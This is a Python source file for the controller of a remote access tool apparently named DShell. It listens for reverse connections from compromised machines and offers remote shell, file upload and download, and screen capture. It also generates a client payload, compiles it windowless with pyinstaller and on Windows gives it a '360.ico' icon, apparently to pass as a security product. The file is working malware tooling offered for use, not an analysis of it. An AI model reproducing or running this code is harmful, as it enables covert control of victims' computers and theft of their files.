#!/usr/bin/python3.7
# -*- coding: utf-8 -*-
# @Author  : Cr4y0n
# @Software: PyCharm
# @Time    : 2020/8/16 8:13

import os
import sys
import socket
import subprocess
from misc.color import Colors
from misc.logo import Logo
from serverModule.shell import Shell
from lib.dsSocket import *
from serverModule.fileOperation import FileOPT
from serverModule.screen import Screen

def checkEnvironment():
    if not os.path.isdir(r"./output/"):
        os.mkdir(r"./output/")

# 连接
def connect(host, port):
    serverHost = host
    serverPort = port
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((serverHost, serverPort))
    server.listen(5)
    msg = " Server is Listening <%s:%s>\n    Waiting……" % (serverHost, serverPort)
    print(Colors.CYAN + "[*]" + Colors.END + msg)
    try:
        clientSocket, clientAddress = server.accept()
    except KeyboardInterrupt:
        server.close()
        return
    # clientSocket.settimeout(3600)
    print(Colors.GREEN + "[+]" + Colors.END + " Receive The Connection " + Colors.GREEN + "<%s:%s>" % (clientAddress[0], clientAddress[1]) + Colors.END)
    return server, clientSocket, clientAddress

# 监听
def listen():
    try:
        host = input("Input LHOST：")
        port = int(input("Input LPORT："))
        # host = "127.0.0.1"
        # port = 9999
        server, clientSocket, clientAddress = connect(host, port)
    except OSError:
        print(Colors.YELLOW + "[!]" + Colors.END + " IP Address Error.")
    except ValueError:
        print(Colors.YELLOW + "[!]" + Colors.END + "Port Error.")
    except KeyboardInterrupt:
        pass
    else:
        optionsList = ["shell", "upload", "download", "quit", "q", "exit"]
        while True:
            try:
                choice = input("Session > ").lower()
                if choice in optionsList:
                    pass
                if choice == "shell":
                    print(Colors.GREEN + "[+]" + Colors.END + " OS Shell Created")
                    shell = Shell(clientSocket)
                    shell.shell()
                elif choice[:6].lower() == "upload":
                    FileOPT(choice, clientSocket).fileUpload()
                elif choice[:8].lower() == "download":
                    FileOPT(choice, clientSocket).fileDownload()
                elif choice.lower() == "screen":
                    Screen(clientSocket)
                elif choice in ["quit", "q", "exit"]:
                    # clientSocket.send(choice.encode(Encode.encoding))
                    DShellSend(clientSocket, choice)
                    break
            except KeyboardInterrupt:
                break
            except:
                pass
        clientSocket.shutdown(2)
        clientSocket.close()
        server.close()

# 生成脚本
def generateScript():
    localPlatform = sys.platform
    remotePlatform = input("Select The Remote System localPlatform(win/linux)： ")
    host = input("Input RHOST：")
    port = input("Input RPORT：")
    with open("./client1.py", "r") as f1, open("./client_tmp.py", "w") as f2:
        for line in f1:
            line = line.replace("$HOST$", host).replace('"$PORT$"', port)
            f2.write(line)
    try:
        # 当前运行平台是Linux
        if "linux" in localPlatform:
            subprocess.Popen("pyinstaller -Fw client_tmp.py", shell=True, stdout=subprocess.PIPE).wait()
            if remotePlatform == "win":
                if not os.path.exists("./docker-pyinstaller/src"):
                    os.mkdir("./docker-pyinstaller/src/")
                cmd = [ "mv client_tmp.spec ./docker-pyinstaller/src", "mv client_tmp.py ./docker-pyinstaller/src"]
                subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).wait()
                os.chdir("./docker-pyinstaller/src")
                cmd = [ "pipreqs ./ --force", "docker run -v \"$(pwd):/src/\" cdrx/pyinstaller-windows"]
                subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).wait()
                print(Colors.GREEN + "[+]" + Colors.END + " Sucessfully! The File in ./dist/")
            else:
                print(Colors.GREEN + "[+]" + Colors.END + " Sucessfully! The File in ./dist/")
            for i in range(2):
                os.chdir(os.path.abspath(os.path.pardir))
        # 当前运行平台是Windows
        elif "win" in localPlatform:
            if remotePlatform == "win":
                subprocess.Popen("pyinstaller -Fw -i ./misc/360.ico client_tmp.py", shell=True, stdout=subprocess.PIPE).wait()
                print(Colors.GREEN + "[+]" + Colors.END + " Sucessfully! The File in ./dist/")
            else:
                if not os.path.exists("./dist/"):
                    os.mkdir("./dist/")
                subprocess.Popen("copy .\client_tmp.py .\dist\client_tmp.py /Y", shell=True, stdout=subprocess.PIPE).wait()
                os.remove("./client_tmp.py")
                print(Colors.GREEN + "[+]" + Colors.END + " Sucessfully! The File in ./dist/")
        else:
            print(Colors.YELLOW + "[!]" + Colors.END + " Only Support Windows/Linux.")
        # 删除临时文件和目录
        cmd = []
        if "win" in localPlatform and remotePlatform == "win":
            cmd = "rd /s/q .\__pycache__ & rd /s/q .\\build & del .\client_tmp.py & del .\client_tmp.spec"
            print(os.getcwd())
        elif "linux" in localPlatform:
            cmd = [ "rm -rf __pycache__", "rm -rf build", "rm client_tmp.py"]
        subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).wait()
    except:
        print("Something Error. Maybe You Should Check The Operating Environment, Like pipreps、docker、docker-pyinstaller、pyinstaller.")

def menu():
    msg = """
 ------------------------------------
| [1] | Generate Remote Script File  |
| [2] | Listen In This Computer      |
| [3] | Vulnerability Scanning       |
| [4] | Information Detection        |
|------------------------------------|
| [0] | Exit                         |
 ------------------------------------
    """
    print(msg)
    choice = input("DShell > ")
    if choice == "1":
        generateScript()
    elif choice == "2":
        listen()
    elif choice == "3":
        print("Waiting……")
    elif choice == "4":
        print("Waiting……")
    elif choice[:10] == "urlExtract":
        args = choice[10:]
        cmd = sys.executable + " ./tools/urlExtractor/urlExtractor.py" + args
        os.system(cmd)
    elif choice == "0" or choice == "q":
        print("\nBye~")
        os._exit(0)
    else:
        pass

if __name__ == "__main__":
    Logo().printLogo()
    checkEnvironment()
    while True:
        try:
            menu()
        except KeyboardInterrupt:
            print("\nBye~")
            os._exit(0)